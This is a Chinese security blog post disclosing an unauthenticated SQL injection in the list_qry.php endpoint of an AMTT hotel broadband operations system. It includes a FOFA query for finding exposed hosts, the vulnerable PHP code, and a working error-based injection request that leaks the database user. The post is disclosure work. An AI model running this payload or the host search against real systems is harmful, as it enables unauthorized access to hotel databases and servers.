---
title: "安美数字酒店宽带运营系统 list_qry.php SQL注入漏洞"
source: https://mrxn.net/jswz/amttgroup-user-list_qry-UserID-sqli.html
asset_dir: assets/安美数字酒店宽带运营系统-list_qry.php-sql注入漏洞
---

# 安美数字酒店宽带运营系统 list\_qry.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/15 18:28
- 691浏览
- [0评论](#comment)
- 9分钟阅读

深入探索

安全

sql

计算机安全

---

# 漏洞简介

安美数字酒店宽带运营系统的 list\_qry.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用SQL注入漏洞获取数据库中的信息之外，甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

SQL注入检测工具

# fofa语法

> `body="http://www.amttgroup.com/" && body="form.ManagerID.focus()"`

# 漏洞分析

user/list\_qry.php 业务逻辑如下

```
if (!isset($UserID) || $UserID == "") {
    //alert_exit($lang['frontdesk_list_billing_bad_account_not_exist'], $goto_url);
    echo $lang['frontdesk_list_billing_bad_account_not_exist'];
    exit;
}

$db = new newDB();

$sqlcmd = "select CheckInFlag,DisableFlag,CheckinDate,Password,AccountType from T_Account where AccountID='$UserID'";

if (($result = $db->query($sqlcmd)) == false) {
    //alert_exit($lang['error_query_failure'], $goto_url);
    echo $lang['error_query_failure'];
    exit;
}
```

深入探索

技术文章订阅

安全研究工具

漏洞扫描器

`$UserID` 没有任何过滤校验操作，直接拼接进SQL语句中执行，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
GET /user/list_qry.php?UserID=1'+and+extractvalue(1,concat(0x7e,user(),0x7e))--+- HTTP/1.1
Host: amttgroup.mrxn.net
```

[![安美数字酒店宽带运营系统 list_qry.php SQL注入漏洞](images/img-001-b3471b0dc762.webp)](https://image.mrxn.net/9787b151388e47008db09bf371b3becc.webp)

成功通过报错注入在响应回显数据库用户信息

代码安全审计

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [4.漏洞复现](#toc-4-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
